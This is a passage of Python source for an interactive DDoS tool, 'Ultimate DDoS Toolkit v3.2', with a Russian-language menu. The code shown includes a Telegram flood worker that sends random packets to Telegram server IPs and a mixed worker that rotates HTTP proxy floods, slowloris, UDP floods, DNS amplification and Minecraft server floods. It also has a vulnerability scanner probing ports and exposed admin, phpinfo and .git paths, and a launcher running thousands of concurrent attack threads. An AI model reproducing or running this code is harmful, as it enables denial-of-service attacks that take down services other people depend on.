                    try:
                        dc_ip = random.choice(["149.154.167.50", "149.154.167.51"])
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        
                        context = ssl.create_default_context()
                        ssl_sock = context.wrap_socket(sock, server_hostname=dc_ip)
                        ssl_sock.connect((dc_ip, 443))
                        
                        fake_packet = struct.pack('!I', random.randint(0, 4294967295)) + os.urandom(96)
                        ssl_sock.send(fake_packet)
                        
                        self.update_stats('sent', 100, telegram=True, packets=1)
                        ssl_sock.close()
                        self.update_stats('success')
                        
                    except:
                        self.update_stats('fail')
                
                time.sleep(0.00001)
                
            except:
                self.update_stats('fail')
                time.sleep(0.001)

    def mixed_super_attack_worker(self):
        attack_methods = [
            self.http_flood_proxy_worker,
            self.slowloris_connection_exhaustion_worker,
            self.udp_flood_worker,
            self.dns_amplification_worker,
            self.minecraft_server_flood_worker,
            self.telegram_flood_worker
        ]
        
        current_method = random.choice(attack_methods)
        
        while self.running:
            try:
                current_method()
                if random.random() > 0.8:
                    current_method = random.choice(attack_methods)
            except:
                self.update_stats('fail')
            
            time.sleep(0.000001)

    def scan_target_vulnerabilities(self):
        print(f"\n{Fore.CYAN}[*] Сканирование цели на уязвимости...")
        print(f"{Fore.YELLOW}[*] Цель: {self.target_url} ({self.target_ip})")
        
        vulnerabilities = []
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            
            for port in [21, 22, 23, 25, 53, 80, 443, 3306, 3389, 8080, 8443]:
                result = sock.connect_ex((self.target_ip, port))
                if result == 0:
                    vulnerabilities.append(f"Порт {port} открыт")
            sock.close()
        except:
            pass
        
        try:
            response = requests.get(f"http://{self.target_url}/wp-admin", timeout=2)
            if response.status_code == 200:
                vulnerabilities.append("WordPress административная панель доступна")
        except:
            pass
        
        try:
            response = requests.get(f"http://{self.target_url}/phpinfo.php", timeout=2)
            if response.status_code == 200 and "phpinfo" in response.text.lower():
                vulnerabilities.append("phpinfo.php доступен")
        except:
            pass
        
        try:
            response = requests.get(f"http://{self.target_url}/.git/HEAD", timeout=2)
            if response.status_code == 200:
                vulnerabilities.append(".git директория доступна")
        except:
            pass
        
        try:
            response = requests.get(f"http://{self.target_url}/administrator", timeout=2)
            if response.status_code == 200:
                vulnerabilities.append("Joomla административная панель доступна")
        except:
            pass
        
        if vulnerabilities:
            print(f"{Fore.RED}[!] Найдены уязвимости:")
            for vuln in vulnerabilities:
                print(f"{Fore.YELLOW}  - {vuln}")
        else:
            print(f"{Fore.GREEN}[+] Уязвимости не найдены")
        
        print(f"\n{Fore.CYAN}[*] Сканирование завершено")
        input(f"\n{Fore.CYAN}[?] Нажмите Enter для продолжения...")

    def start_attack(self, attack_type, target, workers=2500):
        self.target_url = target
        self.num_workers = workers
        self.running = True
        self.attack_type = attack_type
        
        if not self.resolve_target(target):
            print(f"{Fore.RED}[-] Ошибка разрешения цели!")
            return
        
        if target.startswith("https://"):
            self.target_port = 443
        else:
            self.target_port = 80
        
        self.stats = {
            'start_time': datetime.now(),
            'requests_sent': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'bytes_sent': 0,
            'attack_duration': 0,
            'workers_active': 0,
            'target_status': 'Unknown',
            'last_success_time': None,
            'packets_sent': 0,
            'telegram_requests': 0,
            'minecraft_packets': 0,
            'dns_queries': 0,
            'connection_count': 0
        }
        
        self.monitor_running = True
        self.stats_running = True
        
        monitor_thread = threading.Thread(target=self.monitoring_thread, daemon=True)
        monitor_thread.start()
        
        stats_thread = threading.Thread(target=self.stats_display_thread, daemon=True)
        stats_thread.start()
        
        self.log_attack(f"START: {attack_type} attack on {target} with {workers} workers")
        self.log_attack(f"TARGET IP: {self.target_ip}:{self.target_port}")
        
        if attack_type == "async_http":
            print(f"{Fore.YELLOW}[*] Запуск асинхронной атаки...")
            
            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
            
            try:
                self.loop.run_until_complete(self.async_attack_manager(workers))
            except KeyboardInterrupt:
                self.stop_attack()
            except Exception as e:
                print(f"{Fore.RED}[-] Ошибка асинхронной атаки: {e}")
                self.stop_attack()
        else:
            self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=workers)
            
            attack_functions = {
                "http_proxy": self.http_flood_proxy_worker,
                "slowloris": self.slowloris_connection_exhaustion_worker,
                "udp_flood": self.udp_flood_worker,
                "dns_amplification": self.dns_amplification_worker,
                "minecraft": self.minecraft_server_flood_worker,
                "telegram": self.telegram_flood_worker,
                "mixed": self.mixed_super_attack_worker
            }
            
            attack_func = attack_functions.get(attack_type, self.http_flood_proxy_worker)
            
            futures = []
            for _ in range(workers):
                future = self.executor.submit(attack_func)
                futures.append(future)
            
            try:
                while self.running:
                    time.sleep(0.1)
            except KeyboardInterrupt:
                self.stop_attack()

    def stop_attack(self):
        print(f"\n{Fore.YELLOW}[*] Остановка атаки...")
        
        self.running = False
        self.monitor_running = False
        self.stats_running = False
        
        time.sleep(1)
        
        if self.executor:
            self.executor.shutdown(wait=False)
        
        if self.loop:
            try:
                self.loop.stop()
            except:
                pass
        
        duration = self.stats['attack_duration']
        requests = self.stats['requests_sent']
        
        self.log_attack(f"STOP: Duration {duration:.0f}s, Requests: {requests:,}")
        
        final_status = "ONLINE" if self.site_stats['is_online'] else "OFFLINE"
        self.log_attack(f"FINAL TARGET STATUS: {final_status}")
        
        print(f"{Fore.RED}[!] Атака остановлена")
        print(f"{Fore.YELLOW}[*] Запросов отправлено: {requests:,}")
        print(f"{Fore.YELLOW}[*] Финальный статус цели: {final_status}")
        print(f"{Fore.YELLOW}[*] Статистика сохранена в {self.log_file}")
        
        time.sleep(3)

    def monitor_only(self, target):
        self.target_url = target
        
        if not self.resolve_target(target):
            print(f"{Fore.RED}[-] Ошибка разрешения цели!")
            return
        
        self.monitor_running = True
        self.stats_running = True
        
        monitor_thread = threading.Thread(target=self.monitoring_thread, daemon=True)
        monitor_thread.start()
        
        stats_thread = threading.Thread(target=self.stats_display_thread, daemon=True)
        stats_thread.start()
        
        print(f"\n{Fore.GREEN}[+] Мониторинг запущен для {target}")
        print(f"{Fore.YELLOW}[*] Нажмите Ctrl+C для остановки")
        
        try:
            while self.monitor_running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.monitor_running = False
            self.stats_running = False
            time.sleep(1)
            print(f"\n{Fore.YELLOW}[*] Мониторинг остановлен")

    def show_logs(self):
        try:
            if not os.path.exists(self.log_file):
                print(f"{Fore.RED}[-] Лог файл не найден")
                return
            
            with open(self.log_file, 'r', encoding='utf-8') as f:
                logs = f.readlines()
            
            self.clear_screen()
            print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════════╗")
            print(f"{Fore.CYAN}║{Fore.YELLOW}              ПОСЛЕДНИЕ ЗАПИСИ ЛОГОВ                 {Fore.CYAN}║")
            print(f"{Fore.CYAN}╠═══════════════════════════════════════════════════════╣")
            
            for log in logs[-20:]:
                log_line = log.strip()[:55]
                print(f"{Fore.CYAN}║ {Fore.WHITE}{log_line:<55} {Fore.CYAN}║")
            
            print(f"{Fore.CYAN}╚═══════════════════════════════════════════════════════╝")
            
            print(f"\n{Fore.YELLOW}[*] Всего записей: {len(logs)}")
            print(f"{Fore.YELLOW}[*] Полный лог: {self.log_file}")
            
            input(f"\n{Fore.CYAN}[?] Нажмите Enter для продолжения...")
            
        except:
            print(f"{Fore.RED}[-] Ошибка чтения логов")
            time.sleep(2)

    def display_system_stats(self):
        try:
            print(f"\n{Fore.GREEN}╔═══════════════════════════════════════════════════════╗")
            print(f"{Fore.GREEN}║{Fore.YELLOW}                 СИСТЕМНАЯ ИНФОРМАЦИЯ                 {Fore.GREEN}║")
            print(f"{Fore.GREEN}╠═══════════════════════════════════════════════════════╣")
            
            try:
                cpu_percent = psutil.cpu_percent(interval=0.1)
                cpu_color = Fore.GREEN if cpu_percent < 50 else Fore.YELLOW if cpu_percent < 80 else Fore.RED
                print(f"{Fore.GREEN}║{Fore.WHITE} CPU: {cpu_color}{cpu_percent:.1f}%{Fore.WHITE} "
                      f"Ядер: {psutil.cpu_count()}                       {Fore.GREEN}║")
                
                memory = psutil.virtual_memory()
                memory_color = Fore.GREEN if memory.percent < 70 else Fore.YELLOW if memory.percent < 90 else Fore.RED
                print(f"{Fore.GREEN}║{Fore.WHITE} Память: {memory_color}{memory.percent:.1f}%{Fore.WHITE} "
                      f"({memory.used//1024//1024:,}MB/{memory.total//1024//1024:,}MB)   {Fore.GREEN}║")
                
                if self.stats['attack_duration'] > 0:
                    bytes_per_sec = self.stats['bytes_sent'] / self.stats['attack_duration']
                    if bytes_per_sec < 1024:
                        speed_str = f"{bytes_per_sec:.1f} B/s"
                    elif bytes_per_sec < 1024*1024:
                        speed_str = f"{bytes_per_sec/1024:.1f} KB/s"
                    else:
                        speed_str = f"{bytes_per_sec/(1024*1024):.1f} MB/s"
                    
                    print(f"{Fore.GREEN}║{Fore.WHITE} Скорость: {speed_str:<15}               {Fore.GREEN}║")
                
            except:
                print(f"{Fore.GREEN}║{Fore.RED} Ошибка сбора статистики                    {Fore.GREEN}║")
            
            print(f"{Fore.GREEN}║{Fore.WHITE} ОС: {platform.system()} {platform.release()}                 {Fore.GREEN}║")
            print(f"{Fore.GREEN}║{Fore.WHITE} Прокси: {len(self.proxy_list)} доступно                   {Fore.GREEN}║")
            print(f"{Fore.GREEN}║{Fore.WHITE} Лог файл: {self.log_file}                   {Fore.GREEN}║")
            print(f"{Fore.GREEN}╚═══════════════════════════════════════════════════════╝")
        except:
            print(f"{Fore.RED}[!] Ошибка отображения системной статистики")

    def configure_attack(self):
        print(f"\n{Fore.CYAN}[*] Конфигурация атаки")
        
        print(f"\n{Fore.YELLOW}[1] Настройка прокси")
        print(f"{Fore.YELLOW}[2] Настройка User-Agent")
        print(f"{Fore.YELLOW}[3] Настройка таймаутов")
        print(f"{Fore.YELLOW}[4] Настройка путей")
        
        choice = input(f"\n{Fore.CYAN}[?] Выберите опцию: ").strip()
        
        if choice == "1":
            print(f"\n{Fore.YELLOW}[*] Текущие прокси: {len(self.proxy_list)}")
            print(f"{Fore.YELLOW}[*] Перезагрузить прокси? (y/n): ", end="")
            if input().strip().lower() == 'y':
                self.proxy_list = []
                self.load_proxies()
                print(f"{Fore.GREEN}[+] Прокси перезагружены: {len(self.proxy_list)}")
        
        elif choice == "2":
            print(f"\n{Fore.YELLOW}[*] Текущие User-Agent: {len(self.user_agents)}")
            custom_ua = input(f"{Fore.CYAN}[?] Добавить кастомный User-Agent (оставьте пустым для пропуска): ").strip()
            if custom_ua:
                self.user_agents.append(custom_ua)
                print(f"{Fore.GREEN}[+] User-Agent добавлен")
        
        input(f"\n{Fore.CYAN}[?] Нажмите Enter для продолжения...")

    def run(self):
        while True:
            try:
                self.clear_screen()
                self.display_logo()
                self.display_menu()
                
                choice = input(f"\n{Fore.CYAN}[?] Выберите действие (1-12 или 0 для выхода): ")
                
                if choice == "0":
                    print(f"{Fore.YELLOW}[*] Выход...")
                    break
                
                elif choice in ["1", "2", "3", "4", "5", "6", "7", "8"]:
                    if choice == "6":
                        print(f"\n{Fore.MAGENTA}[★] Minecraft Server Flood")
                        target = input(f"{Fore.CYAN}[?] Введите IP:порт сервера: ").strip()
                    elif choice == "7":
                        print(f"\n{Fore.MAGENTA}[★] Telegram Flood")
                        target = input(f"{Fore.CYAN}[?] Введите @username или bot token: ").strip()
                    else:
                        target = input(f"{Fore.CYAN}[?] Введите URL цели: ").strip()
                    
                    if not target:
                        print(f"{Fore.RED}[-] Цель не может быть пустой!")
                        time.sleep(1)
                        continue
                    
                    if choice in ["6", "7"]:
                        if ':' not in target and choice == "6":
                            target = f"{target}:25565"
                    elif not target.startswith("http"):
                        target = "http://" + target
                    
                    if choice != "7":
                        if not self.resolve_target(target):
                            print(f"{Fore.RED}[-] Ошибка разрешения цели!")
                            time.sleep(1)
                            continue
                    
                    if choice == "7":
                        self.target_port = 443
                    elif target.startswith("https://"):
                        self.target_port = 443
                    else:
                        self.target_port = 80
                    
                    default_workers = {
                        "1": 3000, "2": 6000, "3": 1500, "4": 2500,
                        "5": 2000, "6": 3500, "7": 2500, "8": 5000
                    }
                    
                    workers_input = input(f"{Fore.CYAN}[?] Количество воркеров (реком. {default_workers[choice]:,}): ").strip()
                    
                    if workers_input.isdigit():
                        workers = int(workers_input)
                        if workers > 20000:
                            print(f"{Fore.YELLOW}[!] Максимум 20000 воркеров")
                            workers = 20000
                        if workers < 100:
                            print(f"{Fore.YELLOW}[!] Минимум 100 воркеров")
                            workers = 100
                    else:
                        workers = default_workers[choice]
                    
                    attack_types = {
                        "1": "http_proxy",
                        "2": "async_http",
                        "3": "slowloris",
                        "4": "udp_flood",
                        "5": "dns_amplification",
                        "6": "minecraft",
                        "7": "telegram",
                        "8": "mixed"
                    }
                    
                    attack_type = attack_types[choice]
                    
                    print(f"\n{Fore.YELLOW}[*] Запуск {attack_type} атаки...")
                    print(f"{Fore.YELLOW}[*] Цель: {self.target_url} ({self.target_ip}:{self.target_port})")
                    print(f"{Fore.YELLOW}[*] Используется {workers:,} воркеров")
                    print(f"{Fore.RED}[!] Нажмите Ctrl+C для остановки атаки")
                    
                    time.sleep(2)
                    
                    self.start_attack(attack_type, target, workers)
                    
                elif choice == "9":
                    target = input(f"{Fore.CYAN}[?] Введите цель для мониторинга: ").strip()
                    if target:
                        self.monitor_only(target)
                    else:
                        print(f"{Fore.RED}[-] Цель не может быть пустой!")
                        time.sleep(1)
                    
                elif choice == "10":
                    self.show_logs()
                    
                elif choice == "11":
                    target = input(f"{Fore.CYAN}[?] Введите цель для сканирования: ").strip()
                    if target:
                        if not target.startswith("http"):
                            target = "http://" + target
                        if self.resolve_target(target):
                            self.scan_target_vulnerabilities()
                        else:
                            print(f"{Fore.RED}[-] Ошибка разрешения цели!")
                    else:
                        print(f"{Fore.RED}[-] Цель не может быть пустой!")
                        time.sleep(1)
                
                elif choice == "12":
                    self.configure_attack()
                    
                else:
                    print(f"{Fore.RED}[-] Неверный выбор!")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Выход из программы...")
                break
            except Exception as e:
                print(f"{Fore.RED}[-] Ошибка: {e}")
                time.sleep(2)

if __name__ == "__main__":
    try:
        required_modules = ['colorama', 'requests', 'psutil', 'aiohttp', 'dns']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"{Fore.RED}[-] Отсутствуют модули: {', '.join(missing_modules)}")
            print(f"{Fore.YELLOW}[*] Установите: pip install {' '.join(missing_modules)}")
            sys.exit(1)
        
        print(f"{Fore.YELLOW}[*] Запуск Ultimate DDoS Toolkit v3.2...")
        print(f"{Fore.YELLOW}[*] Для максимальной эффективности запустите от имени администратора")
        time.sleep(2)
        
        attack = UltimateDDoSAttack()
        attack.run()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Программа завершена")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[-] Критическая ошибка: {e}")
        sys.exit(1)
